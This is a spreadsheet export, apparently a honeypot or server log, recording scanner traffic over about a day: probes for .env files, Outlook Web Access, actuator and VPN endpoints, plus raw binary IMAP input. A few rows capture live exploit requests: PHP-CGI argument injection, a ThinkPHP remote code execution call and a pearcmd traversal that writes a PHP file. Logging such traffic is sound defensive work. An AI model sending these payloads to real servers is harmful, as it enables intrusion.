            <text:p>2025-02-21 14:37:5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ci/cd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7:57" calcext:value-type="date">
            <text:p>2025-02-21 14:37:5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releases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7:58" calcext:value-type="date">
            <text:p>2025-02-21 14:37:5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v2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7:59" calcext:value-type="date">
            <text:p>2025-02-21 14:37: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modules/auth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8:00" calcext:value-type="date">
            <text:p>2025-02-21 14:38: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.env.stage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8:02" calcext:value-type="date">
            <text:p>2025-02-21 14:38:0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build/.env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8:04" calcext:value-type="date">
            <text:p>2025-02-21 14:38:0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settings/.env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8:05" calcext:value-type="date">
            <text:p>2025-02-21 14:38:0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lib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8:05" calcext:value-type="date">
            <text:p>2025-02-21 14:38:0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docker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8:07" calcext:value-type="date">
            <text:p>2025-02-21 14:38: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.env.testin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4:38:08" calcext:value-type="date">
            <text:p>2025-02-21 14:38:0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1T15:46:44" calcext:value-type="date">
            <text:p>2025-02-21 15:46:4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1T15:46:44" calcext:value-type="date">
            <text:p>2025-02-21 15:46:4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162.142.125.39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15:58:47" calcext:value-type="date">
            <text:p>2025-02-21 15:58:4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162.142.125.39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1T15:58:48" calcext:value-type="date">
            <text:p>2025-02-21 15:58:4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112.162.218.22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21T16:18:33" calcext:value-type="date">
            <text:p>2025-02-21 16:18:3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20.221.71.226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1T16:36:05" calcext:value-type="date">
            <text:p>2025-02-21 16:36:0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184.105.139.6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16:38:29" calcext:value-type="date">
            <text:p>2025-02-21 16:38:2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184.105.139.6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16:38:42" calcext:value-type="date">
            <text:p>2025-02-21 16:38:4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184.105.139.68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1T16:38:42" calcext:value-type="date">
            <text:p>2025-02-21 16:38:4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184.105.139.6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16:38:54" calcext:value-type="date">
            <text:p>2025-02-21 16:38:5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184.105.139.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] {w�$|�yiܙ;J�}�Ct$UDJv���Ey�p�9���/�+����<text:tab/>��</text:p>
            <text:p>/5�</text:p>
            <text:p>4</text:p>
            <text:p/>
            <text:p>�</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T16:38:54" calcext:value-type="date">
            <text:p>2025-02-21 16:38:5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184.105.139.68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1T16:38:55" calcext:value-type="date">
            <text:p>2025-02-21 16:38:5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152.42.176.88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1T16:42:42" calcext:value-type="date">
            <text:p>2025-02-21 16:42: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54.212.141.166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1T17:08:15" calcext:value-type="date">
            <text:p>2025-02-21 17:08:1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92.255.57.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78.0.3904.108 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T17:31:30" calcext:value-type="date">
            <text:p>2025-02-21 17:31:3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198.235.24.6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68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T17:44:25" calcext:value-type="date">
            <text:p>2025-02-21 17:44:2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103.56.60.82</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /cdn-cgi/trace</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T18:41:45" calcext:value-type="date">
            <text:p>2025-02-21 18:41:4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35.240.127.19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32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T18:55:34" calcext:value-type="date">
            <text:p>2025-02-21 18:55:3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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T19:31:19" calcext:value-type="date">
            <text:p>2025-02-21 19:31:1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.env.sandbox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9:31:20" calcext:value-type="date">
            <text:p>2025-02-21 19:31:2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settings/.env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9:31:21" calcext:value-type="date">
            <text:p>2025-02-21 19:31:2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.env.template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9:31:22" calcext:value-type="date">
            <text:p>2025-02-21 19:31:2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assets..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9:31:23" calcext:value-type="date">
            <text:p>2025-02-21 19:31:2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docker-compose.prod.yml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1T19:31:25" calcext:value-type="date">
            <text:p>2025-02-21 19:31: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162.142.125.19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19:31:55" calcext:value-type="date">
            <text:p>2025-02-21 19:31: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162.142.125.198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1T19:31:56" calcext:value-type="date">
            <text:p>2025-02-21 19:31:5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92.255.57.58</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /actuator/gateway/routes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T19:33:19" calcext:value-type="date">
            <text:p>2025-02-21 19:33:1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44.220.188.100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19:39:48" calcext:value-type="date">
            <text:p>2025-02-21 19:39:4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44.220.188.100</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a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1T19:39:49" calcext:value-type="date">
            <text:p>2025-02-21 19:39:4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43.157.180.11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1T19:47:50" calcext:value-type="date">
            <text:p>2025-02-21 19:47:5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43.249.36.11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ModatScanner/1.0; +https://modat.io/)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T21:41:14" calcext:value-type="date">
            <text:p>2025-02-21 21:41:1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198.235.24.177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22:02:29" calcext:value-type="date">
            <text:p>2025-02-21 22:02:2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198.235.24.177</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001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1T22:02:30" calcext:value-type="date">
            <text:p>2025-02-21 22:02:3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49.51.36.17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1T22:06:54" calcext:value-type="date">
            <text:p>2025-02-21 22:06:5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185.156.73.77</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /RDWeb/Pages/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T22:21:24" calcext:value-type="date">
            <text:p>2025-02-21 22:21:2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88.0.4324.190 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T22:22:39" calcext:value-type="date">
            <text:p>2025-02-21 22:22:3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107.170.33.21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1T22:33:20" calcext:value-type="date">
            <text:p>2025-02-21 22:33:2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1T22:43:41" calcext:value-type="date">
            <text:p>2025-02-21 22:43:4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1T22:43:41" calcext:value-type="date">
            <text:p>2025-02-21 22:43:4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45.156.129.4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60.0.3112.113 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T22:56:55" calcext:value-type="date">
            <text:p>2025-02-21 22:56:5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172.214.113.125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1T23:09:40" calcext:value-type="date">
            <text:p>2025-02-21 23:09:4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172.214.113.125</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] MGLNDD_15.235.199.137_143</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T23:09:40" calcext:value-type="date">
            <text:p>2025-02-21 23:09:4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69.145.176.12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21T23:46:44" calcext:value-type="date">
            <text:p>2025-02-21 23:46:4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POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input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2" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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3" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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3" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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3" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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3" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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4" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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4" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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4" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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4" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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5" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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6" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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GET /index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello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GET /public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Hello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GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?echo(md5("hi"));?&gt;+/tmp/index1.php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7" calcext:value-type="date">
            <text:p>2025-02-21 23:47:1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GET /index.php?lang=../../../../../../../../tmp/index1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8" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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8.222.166.37</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /containers/json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1T23:47:18" calcext:value-type="date">
            <text:p>2025-02-21 23:47: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185.93.89.126</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>POST /ssl-vpn/hipreport.esp</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-21T23:50:06" calcext:value-type="date">
            <text:p>2025-02-21 23:50:0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202.112.47.14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2T00:21:08" calcext:value-type="date">
            <text:p>2025-02-22 00:21:0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196.251.69.18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SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T01:00:58" calcext:value-type="date">
            <text:p>2025-02-22 01:00:5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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:02:28" calcext:value-type="date">
            <text:p>2025-02-22 02:02:2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assets..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02:02:31" calcext:value-type="date">
            <text:p>2025-02-22 02:02:3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project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02:02:32" calcext:value-type="date">
            <text:p>2025-02-22 02:02:3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43.167.239.6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2T02:07:08" calcext:value-type="date">
            <text:p>2025-02-22 02:07:0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44.220.188.16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2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3038.70 Safari/537.32</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:08:42" calcext:value-type="date">
            <text:p>2025-02-22 02:08:4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147.185.132.22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2T02:08:52" calcext:value-type="date">
            <text:p>2025-02-22 02:08:5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65.49.1.1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AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:09:17" calcext:value-type="date">
            <text:p>2025-02-22 02:09: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65.49.1.16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Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:09:31" calcext:value-type="date">
            <text:p>2025-02-22 02:09:3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65.49.1.1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OW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:09:34" calcext:value-type="date">
            <text:p>2025-02-22 02:09:3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198.235.24.8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68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T02:36:53" calcext:value-type="date">
            <text:p>2025-02-22 02:36:5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44.220.185.20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2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/59.0.3059.56 Safari/537.32</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T03:08:21" calcext:value-type="date">
            <text:p>2025-02-22 03:08:2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205.210.31.230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03:38:08" calcext:value-type="date">
            <text:p>2025-02-22 03:38:0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205.210.31.230</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001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2T03:38:09" calcext:value-type="date">
            <text:p>2025-02-22 03:38:0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172.168.40.8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2T04:00:34" calcext:value-type="date">
            <text:p>2025-02-22 04:00:3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162.142.125.115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04:20:48" calcext:value-type="date">
            <text:p>2025-02-22 04:20:4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162.142.125.115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2T04:20:49" calcext:value-type="date">
            <text:p>2025-02-22 04:20:4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159.65.99.3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2T04:52:05" calcext:value-type="date">
            <text:p>2025-02-22 04:52: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159.65.99.32</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /login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2T04:52:06" calcext:value-type="date">
            <text:p>2025-02-22 04:52:0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35.203.210.160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2T05:04:30" calcext:value-type="date">
            <text:p>2025-02-22 05:04:3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35.203.210.160</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa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2T05:07:25" calcext:value-type="date">
            <text:p>2025-02-22 05:07:2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98.80.4.97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05:34:47" calcext:value-type="date">
            <text:p>2025-02-22 05:34:4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98.80.4.97</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a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2T05:34:48" calcext:value-type="date">
            <text:p>2025-02-22 05:34:4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07.170.69.175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2T05:43:57" calcext:value-type="date">
            <text:p>2025-02-22 05:43:5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161.132.55.89</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /remote/login?lang=en</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T06:04:09" calcext:value-type="date">
            <text:p>2025-02-22 06:04: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43.135.182.4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2T06:08:52" calcext:value-type="date">
            <text:p>2025-02-22 06:08:5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205.210.31.21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2T06:49:41" calcext:value-type="date">
            <text:p>2025-02-22 06:49:4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18.216.128.21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Chrome/126.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T07:34:31" calcext:value-type="date">
            <text:p>2025-02-22 07:34:3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44.220.188.24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2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/54.0.3021.95 Safari/537.32</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T07:40:28" calcext:value-type="date">
            <text:p>2025-02-22 07:40:2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172.212.61.216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08:46:31" calcext:value-type="date">
            <text:p>2025-02-22 08:46:3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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T08:59:23" calcext:value-type="date">
            <text:p>2025-02-22 08:59:2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.env.stage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08:59:29" calcext:value-type="date">
            <text:p>2025-02-22 08:59:2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.env.backup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08:59:30" calcext:value-type="date">
            <text:p>2025-02-22 08:59:3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.env.prod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08:59:32" calcext:value-type="date">
            <text:p>2025-02-22 08:59:3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.env.production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08:59:33" calcext:value-type="date">
            <text:p>2025-02-22 08:59:3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.env.dev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08:59:33" calcext:value-type="date">
            <text:p>2025-02-22 08:59:3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195.178.110.163</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /configuration/.env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08:59:35" calcext:value-type="date">
            <text:p>2025-02-22 08:59:3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205.210.31.54</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa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2T09:07:42" calcext:value-type="date">
            <text:p>2025-02-22 09:07:4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147.185.132.21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2T09:07:59" calcext:value-type="date">
            <text:p>2025-02-22 09:07:5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143.198.30.14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09:44:07" calcext:value-type="date">
            <text:p>2025-02-22 09:44:0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143.198.30.148</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1</text:p>
            <text:p>Host: 15.235.199.137:143</text:p>
            <text:p>User-Agent: Mozilla/5.0 zgrab/0.x</text:p>
            <text:p>Accept: */*</text:p>
            <text:p>Accept-Encoding: gzip</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T09:44:07" calcext:value-type="date">
            <text:p>2025-02-22 09:44:0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143.198.30.148</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /squid-internal-mgr/cachemgr.cgi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2T09:48:01" calcext:value-type="date">
            <text:p>2025-02-22 09:48:0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88.0.4324.190 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T09:50:58" calcext:value-type="date">
            <text:p>2025-02-22 09:50:5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13.91.179.102</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /actuator/health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2T09:52:23" calcext:value-type="date">
            <text:p>2025-02-22 09:52:2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49.51.178.4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2T10:09:22" calcext:value-type="date">
            <text:p>2025-02-22 10:09:2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205.210.31.226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10:28:14" calcext:value-type="date">
            <text:p>2025-02-22 10:28:1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205.210.31.226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2T10:28:14" calcext:value-type="date">
            <text:p>2025-02-22 10:28:1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205.210.31.226</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] ��P4e���k}�~|`�cH�����jS�sC� (</text:p>
            <text:p>�6i*�H8&amp;�C��O�bg1Xt։J�d$B&amp;�+�/�,�0̨̩�<text:tab/>��</text:p>
            <text:p>���/5�</text:p>
            <text:p>{</text:p>
            <text:p/>
            <text:p/>
            <text:p>�+     3&amp;$ ���fr��=�)�uG�r��ԦzK&amp;����ku</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T10:28:14" calcext:value-type="date">
            <text:p>2025-02-22 10:28:1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205.210.31.226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10:28:15" calcext:value-type="date">
            <text:p>2025-02-22 10:28:15</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>�mE�g�:�Wy�-Ƽrh���/�+�0�</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>���'�#������ش�d�(�$��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���gk39��&lt;=/5�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28@fj��5</text:p>
          </table:table-cell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�"</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="date" office:date-value="2025-02-22T10:28:15" calcext:value-type="date">
            <text:p>2025-02-22 10:28:15</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="Default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205.210.31.226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2T10:28:15" calcext:value-type="date">
            <text:p>2025-02-22 10:28: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44.220.185.93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10:39:42" calcext:value-type="date">
            <text:p>2025-02-22 10:39:4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44.220.185.93</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a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2T10:39:42" calcext:value-type="date">
            <text:p>2025-02-22 10:39:4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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:00:06" calcext:value-type="date">
            <text:p>2025-02-22 11:00:0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dev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11:00:20" calcext:value-type="date">
            <text:p>2025-02-22 11:00:2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app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11:00:21" calcext:value-type="date">
            <text:p>2025-02-22 11:00:2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cms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11:00:22" calcext:value-type="date">
            <text:p>2025-02-22 11:00:2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modules/api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11:00:23" calcext:value-type="date">
            <text:p>2025-02-22 11:00:2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user_backend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11:00:25" calcext:value-type="date">
            <text:p>2025-02-22 11:00:2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139.59.27.106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2T11:20:04" calcext:value-type="date">
            <text:p>2025-02-22 11:20:0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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /CqFb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:33" calcext:value-type="date">
            <text:p>2025-02-22 11:20:3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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /iv1M</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:34" calcext:value-type="date">
            <text:p>2025-02-22 11:20:3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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /aab8</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:35" calcext:value-type="date">
            <text:p>2025-02-22 11:20:3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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /jquery-3.3.1.slim.min.js</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:36" calcext:value-type="date">
            <text:p>2025-02-22 11:20:3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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /aab9</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:38" calcext:value-type="date">
            <text:p>2025-02-22 11:20:3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148.153.56.86</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /jquery-3.3.2.slim.min.js</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:20:40" calcext:value-type="date">
            <text:p>2025-02-22 11:20:4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185.247.137.22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InternetMeasurement/1.0; +https://internet-measurement.com/)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:28:19" calcext:value-type="date">
            <text:p>2025-02-22 11:28:1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185.247.137.32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InternetMeasurement/1.0; +https://internet-measurement.com/)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:28:20" calcext:value-type="date">
            <text:p>2025-02-22 11:28:2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64.227.109.89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InternetMeasurement/1.0; +https://internet-measurement.com/)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T11:28:22" calcext:value-type="date">
            <text:p>2025-02-22 11:28:2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198.235.24.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68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T13:34:21" calcext:value-type="date">
            <text:p>2025-02-22 13:34:2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44.220.185.15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2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3060.77 Safari/537.32</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T13:40:33" calcext:value-type="date">
            <text:p>2025-02-22 13:40:3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89.248.172.41</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HEAD /playlist.m3u</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.105 Version/17.0 Mobile/15E148 Safari/604.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T13:41:54" calcext:value-type="date">
            <text:p>2025-02-22 13:41:5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44.220.188.76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13:46:52" calcext:value-type="date">
            <text:p>2025-02-22 13:46:5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44.220.188.76</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a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2T13:46:52" calcext:value-type="date">
            <text:p>2025-02-22 13:46:5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43.157.149.18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2T14:07:08" calcext:value-type="date">
            <text:p>2025-02-22 14:07:0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64.62.197.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.14; rv:62.0) Gecko/20100101 Firefox/62.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:08:05" calcext:value-type="date">
            <text:p>2025-02-22 14:08:0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64.62.197.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HEAD /owa/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:11:21" calcext:value-type="date">
            <text:p>2025-02-22 14:11:2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64.62.197.7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:11:50" calcext:value-type="date">
            <text:p>2025-02-22 14:11:5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64.62.197.10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Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:15:57" calcext:value-type="date">
            <text:p>2025-02-22 14:15:5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64.62.197.1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.14; rv:62.0) Gecko/20100101 Firefox/62.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:17:08" calcext:value-type="date">
            <text:p>2025-02-22 14:17:0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64.62.197.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/auth/x.js</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:17:35" calcext:value-type="date">
            <text:p>2025-02-22 14:17:3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2T14:18:47" calcext:value-type="date">
            <text:p>2025-02-22 14:18:4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2T14:18:47" calcext:value-type="date">
            <text:p>2025-02-22 14:18:4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64.62.197.2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /geoserver/web/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:21:02" calcext:value-type="date">
            <text:p>2025-02-22 14:21:0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8.219.153.58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2T14:21:40" calcext:value-type="date">
            <text:p>2025-02-22 14:21:4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8.219.153.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1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-22T14:21:43" calcext:value-type="date">
